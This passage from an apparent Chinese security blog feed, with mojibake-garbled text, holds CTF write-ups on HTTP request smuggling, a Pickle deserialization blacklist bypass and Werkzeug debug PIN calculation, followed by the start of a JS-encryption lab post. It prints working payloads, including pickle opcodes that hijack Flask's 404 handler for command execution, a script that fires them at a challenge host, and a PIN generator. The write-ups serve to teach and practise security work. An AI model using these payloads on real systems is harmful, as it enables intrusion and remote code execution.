class="line">åœ¨æ‰“?CTF? ?æœ€åä¸€å‘¨æ‰“äº†? ?æƒ³è¦flag??è·Ÿæˆ‘çš„wafè¯´å»å§,æˆ‘ä»¬éƒ½åœ¨ç”¨åŠ›çš„æ´»ç€</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹é™„ä»¶ç»™çš„æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿›æ¥æ˜¯ä¸€ä¸ªåŠé€€é»‘åå•</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114081921650.png" alt="image-20251114081921650"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§„èŒƒå­—ç¬¦ä¸²å‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114082030577.png" alt="image-20251114082030577"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpè§£æ</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114082055661.png" alt="image-20251114082055661"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç†æœåŠ¡å™¨é€»è¾‘</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114083040736.png" alt="image-20251114083040736"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¼æ´ç‚¹ï¼ševal</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114083126739.png" alt="image-20251114083126739"></p><p>æ¼æ´ç‚¹è¦ä½¿ç”¨çš„æ˜¯postè¯·æ±‚ï¼Œå…³æ³¨ä»£ç†æœåŠ¡å™¨é€»è¾‘</p><p>ä»£ç†æœåŠ¡å™¨åˆ™æ£€æŸ¥ä½ çš„å‚æ•°ï¼Œè¿‡æ»¤æ¶æ„å‚æ•°,å…³æ³¨å‰åç«¯è§£æçš„è¯·æ±‚</p><p>å¤´ï¼Œæ€ä¹ˆæ ·ç®—æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ•°æ®åŒ…<img src="/../images/image-20251114084303877.png" alt="image-20251114084303877"></p><p><img src="/../images/image-20251114084429534.png" alt="image-20251114084429534"></p><p>å°±æ˜¯å‰ç«¯å¤„ç†è¯·æ±‚å¤´clï¼Œåç«¯å¤„ç†teï¼Œå‡ºç°äº†è§£æå·®å¼‚ï¼Œè§¦å‘çš„httpè¯·æ±‚èµ°ç§ï¼Œå¯ä»¥çœ‹çœ‹å‰é¢è´´çš„æ–‡ç« </p><p><img src="/../images/image-20251114084605835.png" alt="image-20251114084605835"></p><p>è§£æTEæ—¶ä¼šæŠŠ0è§†ä½œæ•°æ®åœæ­¢çš„æ ‡å¿—ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥åŠ ä¸ª0ï¼Œç„¶ååé¢åŠ ä¸ª&amp;ç”¨äºä¼ é€’å…¶ä»–å‚æ•°ï¼Œæ³¨æ„æ˜¯pythonçš„æ‰§è¡Œå‘½ä»¤</p><p><img src="/../images/image-20251114090106658.png" alt="image-20251114090106658"></p><h3 id="è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°"><a href="#è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°" class="headerlink" title="è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°"></a><strong>è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡è§è¿‡ï¼Ÿæœä¸€ä¸‹ï¼åœ¨/flag</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•"><a href="#è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•" class="headerlink" title="è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•"></a>è€ƒç‚¹ï¼šPickleååºåˆ—åŒ–åŠç»•è¿‡é»‘åå•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/7032</span><br><span class="line">https://goodapple.top/archives/1069</span><br><span class="line">https://dummykitty.github.io/posts/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æç¤ºä¾æ—§æ˜¯&#x2F;srcä¸‹çš„æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PICKLE_BLACKLIST = [</span><br><span class="line">    b&#x27;eval&#x27;,</span><br><span class="line">    b&#x27;os&#x27;,</span><br><span class="line">    b&#x27;x80&#x27;,</span><br><span class="line">    b&#x27;before&#x27;,</span><br><span class="line">    b&#x27;after&#x27;,</span><br><span class="line">]</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/deser&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def deser():</span><br><span class="line">    a = request.form.get(&#x27;a&#x27;)</span><br><span class="line">    if not a:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        decoded_data = base64.b64decode(a)</span><br><span class="line">        print(decoded_data)</span><br><span class="line">    except: </span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    </span><br><span class="line">    for forbidden in PICKLE_BLACKLIST:</span><br><span class="line">        if forbidden in decoded_data:</span><br><span class="line">            return &quot;waf&quot;</span><br><span class="line">    try:</span><br><span class="line">        result = pickle.loads(decoded_data)</span><br><span class="line">        return &quot;done&quot;</span><br><span class="line">    except:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><p>å‡ºç°äº†ååºåˆ—åŒ–å‡½æ•°pickle.loads()</p><p><img src="/../images/image-20251114091410013.png" alt="image-20251114091410013"></p><p>å›å¤´å…³æ³¨ä¸€ä¸‹é»‘åå•</p><p><img src="/../images/image-20251114091454785.png" alt="image-20251114091454785"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval,osæ˜¯å‘½ä»¤æ‰§è¡Œçš„é»‘åå•</span><br><span class="line">beforeå’Œafteræ˜¯é’©å­å‡½æ•°è¿‡æ»¤ï¼Œ</span><br><span class="line">pickle.dumps()ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºx80ï¼Œ</span><br></pre></td></tr></table></figure><p>evalå¯ä»¥ç”¨execï¼Œé’©å­å‡½æ•°å¯ä»¥ç”¨error_handlerï¼Œosç”¨æ‹¼æ¥ï¼Œ&#x2F;x80å¯ä»¥è‡ªå®šä¹‰ä¸ºåè®®ç‰ˆæœ¬0å°±ä¸ä¼šå‡ºç°&#x2F;x80</p><p>æ„é€ æ¶æ„çš„æ“ä½œç opcodeã€è´´çš„éƒ½æ˜¯å®˜pçš„wpã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">eval</span><br><span class="line">(S&#x27;print(__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read())&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins æ˜¯ pickle åè®®ï¼ˆç‰ˆæœ¬ 0ï¼‰ é‡Œçš„ä¸€æ¡ æ“ä½œç </span><br><span class="line">ç¯¡æ”¹ Flask 404 handlerï¼Œå®ç° RCE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">exec</span><br><span class="line">(S&#x27;global exc_class;global code; exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a: __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(request.args.get(&#x27;0&#x27;)).read()&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">BASE_URL = &quot;http://challenge.ilovectf.cn:30554&quot;</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">exec</span><br><span class="line">(S&#x27;global exc_class;global code; exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a: __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(request.args.get(&#x27;0&#x27;)).read()&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(opcode).decode()</span><br><span class="line"></span><br><span class="line">def send_requests():</span><br><span class="line">    try:</span><br><span class="line">        # ç¬¬ä¸€æ­¥ï¼šä¸‹å‘ payload</span><br><span class="line">        deser_url = f&quot;&#123;BASE_URL&#125;/deser&quot;</span><br><span class="line">        post_data = &#123;&quot;a&quot;: payload&#125;</span><br><span class="line">        print(f&quot;[+] POST &#123;deser_url&#125;  data=&#123;post_data&#125;&quot;)</span><br><span class="line">        r1 = requests.post(deser_url, data=post_data, timeout=10)</span><br><span class="line">        print(f&quot;[*] POST çŠ¶æ€ç ï¼š&#123;r1.status_code&#125;  å“åº”ï¼š&#123;r1.text&#125;\n&quot;)</span><br><span class="line"></span><br><span class="line">        # ç¬¬äºŒæ­¥ï¼šè§¦å‘ 404 å¹¶æ‰§è¡Œå‘½ä»¤</span><br><span class="line">        get_url = f&quot;&#123;BASE_URL&#125;/1&quot;</span><br><span class="line">        get_params = &#123;&quot;0&quot;: &quot;cat /flag&quot;&#125;</span><br><span class="line">        print(f&quot;[+] GET  &#123;get_url&#125;  params=&#123;get_params&#125;&quot;)</span><br><span class="line">        r2 = requests.get(get_url, params=get_params, timeout=10)</span><br><span class="line">        print(f&quot;[*] GET  çŠ¶æ€ç ï¼š&#123;r2.status_code&#125;  å“åº”ï¼š&#123;r2.text&#125;&quot;)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;[!] è¯·æ±‚å¤±è´¥ï¼š&#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    send_requests()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114102556131.png" alt="image-20251114102556131"></p><h3 id="å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»"><a href="#å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»" class="headerlink" title="å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»"></a><strong>å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯¥è¯»äº›ä»€ä¹ˆå‘¢ï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip"><a href="#è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip" class="headerlink" title="è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip"></a>è€ƒç‚¹ï¼šflaskè®¡ç®—pinç ï¼Œæ–°ç‰ˆæœ¬Werkzeugçš„tip</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/m1xian/p/18528813</span><br><span class="line">https://sun1028.top/2025/05/09/flask%e8%ae%a1%e7%ae%97pin%e7%a0%81/</span><br></pre></td></tr></table></figure><p>éšä¾¿è®¿é—®ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹æŠ¥é”™</p><p><img src="/../images/image-20251114104245794.png" alt="image-20251114104245794"></p><p><img src="/../images/image-20251114104254487.png" alt="image-20251114104254487"></p><p>æŸ¥çœ‹app.pyæ–‡ä»¶ï¼Œå‘ç°å¼€å¯äº†debugæ¨¡å¼</p><p><img src="/../images/image-20251114104350857.png" alt="image-20251114104350857"></p><p>æ€è·¯å°±æ˜¯è¦æ€ä¹ˆä½¿ç”¨debugæ¨¡å¼ï¼Œä½¿ç”¨&#x2F;consoleè°ƒè¯•å™¨ï¼Œå‰é¢çš„æŠ¥é”™æ˜¾ç¤ºæ˜¯werkzeug çš„ debug æ¨¡å—ï¼Œ</p><p>werkzeug çš„ debug æ¨¡å—ä¸­æä¾›çš„ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œç”¨äºä¿æŠ¤è°ƒè¯•å™¨ï¼ˆ<code>/console</code>ï¼‰ä¸è¢«æœªæˆæƒè®¿é—®ã€PIN ç ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/m1xian/p/18528813</span><br></pre></td></tr></table></figure><p>uuid:</p><p><img src="/../images/image-20251114105200234.png" alt="image-20251114105200234"></p><p>machine_id:</p><p><img src="/../images/image-20251114105310262.png" alt="image-20251114105310262"></p><p><img src="/../images/image-20251114105332937.png" alt="image-20251114105332937"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line"># å¯èƒ½æ˜¯å…¬å¼€çš„ä¿¡æ¯éƒ¨åˆ†</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,  # /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,  # é»˜è®¤å€¼</span><br><span class="line">    &#x27;Flask&#x27;,  # é»˜è®¤å€¼</span><br><span class="line">    &#x27;/home/ctf/app/app.py&#x27;  # moddirï¼ŒæŠ¥é”™å¾—åˆ°</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># ç§æœ‰ä¿¡æ¯éƒ¨åˆ†</span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;42362379744178&#x27;,  # /sys/class/net/eth0/address åè¿›åˆ¶</span><br><span class="line">    &#x27;89b34b88-6f33-4c4b-8a30-69a4ba41fd0e&#x27;</span><br><span class="line">    # machine-idéƒ¨åˆ†</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºå“ˆå¸Œå¯¹è±¡</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"></span><br><span class="line"># è¿­ä»£å¯èƒ½å…¬å¼€å’Œç§æœ‰çš„ä¿¡æ¯è¿›è¡Œå“ˆå¸Œè®¡ç®—</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line"></span><br><span class="line"># åŠ ç›å¤„ç†</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line"># ç”Ÿæˆ cookie åç§°</span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line">print(cookie_name)</span><br><span class="line"></span><br><span class="line"># ç”Ÿæˆ pin ç </span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line"># æ ¼å¼åŒ– pin ç </span><br><span class="line">rv = None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>è·å–äº†pinç ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è·å–cookieï¼Œå°±ç›´æ¥è´´å®˜päº†</p><p><a href="https://mp.weixin.qq.com/s/VZSk9KRRv7gZ25EXD1AlZQ">å¾®ä¿¡å…¬ä¼—å¹³å°</a></p>]]></content>
      
      
      <categories>
          
          <category> é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹jsé€†å‘åŸºç¡€</title>
      <link href="/posts/55713.html"/>
      <url>/posts/55713.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç›®å‰å¤§é‡çš„æµ‹è¯•çš„ç«™ç‚¹å½“ä¸­å‘ç°å¾ˆå¤§éƒ¨åˆ†ä½¿ç”¨äº†åŠ å¯†ï¼Œåˆšå¥½a1ä½¬ä¹Ÿç»™è®²äº†è¿™ä¸€éƒ¨åˆ†</span><br><span class="line">äºæ˜¯åšä¸€åšencrypt-labsé¶åœºï¼ŒåŠ å¼ºå­¦ä¹ ä¸€ä¸‹ï¼Œä¸æ¶‰åŠæ··æ·†ä»¥åŠjsrpcéƒ¨åˆ†</span><br></pre></td></tr></table></figure><p>é¶åœºï¼š<a href="https://github.com/SwagXz/encrypt-labs">https://github.com/SwagXz/encrypt-labs</a></p><p>butt3rf1yå§å§çš„wpï¼š<a href="https://buutt3rf1y.github.io/2025/05/27/JS-%E9%80%86%E5%90%91%E4%B9%8B-encrypt-labs/#%E5%89%8D%E8%A8%80">(ï½¡ï½¥Ï‰ï½¥ï½¡)æ³¥åš</a></p><p>è¿˜å­¦ä¹ äº†é¶åœºå¸ˆå‚…æ¨èçš„æ–‡ç« å°±ä¸å¼•ç”¨äº†ï¼Œå¯ä»¥å»ä¸Šé¢GitHubé“¾æ¥æŸ¥çœ‹ã€‚</p><h1 id="jsé€†å‘"><a href="#jsé€†å‘" class="headerlink" title="jsé€†å‘"></a>jsé€†å‘</h1><h2 id="AES-å›ºå®š-key"><a href="#AES-å›ºå®š-key" class="headerlink" title="AES å›ºå®š key"></a>AES å›ºå®š key</h2><p><img src="/../images/image-20251105144235805.png" alt="image-20251105144235805"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å®šä½å…¶aesä»£ç </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105150619559.png" alt="image-20251105150619559"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç»™äº†keyï¼Œivæ”¾åˆ°æ’ä»¶ä¸Šè§£å¯†å°±å¥½äº†</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105151127208.png" alt="image-20251105151127208"></p><h2 id="AES-æœåŠ¡ç«¯è·å–-Key"><a href="#AES-æœåŠ¡ç«¯è·å–-Key" class="headerlink" title="AES æœåŠ¡ç«¯è·å– Key"></a>AES æœåŠ¡ç«¯è·å– Key</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¼šæœ‰ä¸¤ä¸ªè¯·æ±‚çš„æ•°æ®åŒ…ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¿”å›aes_key,ivã€‚ç¬¬äºŒä¸ªæ˜¯è¯·æ±‚çš„åŠ å¯†çš„ç™»å½•è¯·æ±‚</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105190819363.png" alt="image-20251105190819363"></p><p><img src="/../images/image-20251105190836855.png" alt="image-20251105190836855"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å®šä½åˆ°jsä»£ç ï¼Œå°è¯•å¤šè¯·æ±‚å‡ æ¬¡ï¼Œå‘ç°æœåŠ¡ç«¯çš„keyï¼Œivæ²¡æœ‰æ”¹å˜ï¼Œè·Ÿä¸Šé¢æ„ä¸€æ ·è§£å¯†æ„é€ å°±å¥½äº†</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105191125444.png" alt="image-20251105191125444"></p><p><img src="/../images/image-20251105191310879.png" alt="image-20251105191310879"></p><p><img src="/../images/image-20251105191348394.png" alt="image-20251105191348394"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°†passwordæ”¹æˆ123456å³å¯æ˜¾ç¤ºtrue</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105191431329.png" alt="image-20251105191431329"></p><h2 id="RSA-åŠ å¯†"><a href="#RSA-åŠ å¯†" class="headerlink" title="RSA åŠ å¯†"></a>RSA åŠ å¯†</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsä»£ç å®šä½åˆ°publickey</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105191609242.png" alt="image-20251105191609242"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºåªè·å¾—äº†å…¬é’¥ï¼Œæ‰€ä»¥åªèƒ½åŠ å¯†</span><br><span class="line"></span><br><span class="line">æ‹¿ç€å…¬é’¥å»æ„é€ &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;çš„è¯·æ±‚æ•°æ®</span><br><span class="line">å®é™…ä¸Šåªæ‹¿åˆ°å…¬é’¥ï¼Œä¸çŸ¥é“æ•°æ®ä½“çš„ç»“æ„æ“ä½œæ€§ä¸å¤§</span><br></pre></td></tr></table></figure><h2 id="AES-RSA-åŠ å¯†"><a href="#AES-RSA-åŠ å¯†" class="headerlink" title="AES + RSA åŠ å¯†"></a>AES + RSA åŠ å¯†</h2><p><img src="/../images/image-20251105193436178.png" alt="image-20251105193436178"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å®šä½åˆ°ç›¸åº”çš„jsä»£ç </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105193659550.png" alt="image-20251105193659550"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä½†åŠ å¯†ä½¿ç”¨çš„keyå’Œivæ˜¯16ä½éšæœºæ•°ï¼Œå¾—åˆ°encryptedData</span><br><span class="line">ç„¶åå¯¹keyå’Œivè¿›è¡ŒrsaåŠ å¯†</span><br><span class="line">å¾—åˆ°encryptedKeyå’Œ encryptedIvå°†éšæœº 16 ä½çš„keyå’Œivè¿›è¡Œå›ºå®š</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const key = CryptoJS.enc.Utf8.parse(&quot;1234567890123456&quot;);</span><br><span class="line">const iv = CryptoJS.enc.Utf8.parse(&quot;1234567890123456&quot;);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105194020985.png" alt="image-20251105194020985"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åé‡æ–°è¯·æ±‚ï¼Œç»è¿‡å‡ æ¬¡ç™»å½•å‘ç° encryptedData ä¸ä¼šå˜ï¼Œä½† Key å’Œ Iv ä¼šæ”¹å˜ï¼Œè¯´æ˜ä¿®æ”¹æˆåŠŸäº†</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105194420962.png" alt="image-20251105194420962"></p><p><img src="/../images/image-20251105194602318.png" alt="image-20251105194602318"></p><h2 id="Des-è§„å¾‹-Key"><a href="#Des-è§„å¾‹-Key" class="headerlink" title="Des è§„å¾‹ Key"></a>Des è§„å¾‹ Key</h2><p><img src="/../images/image-20251105195123740.png" alt="image-20251105195123740"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç®€å•çš„DESåŠ 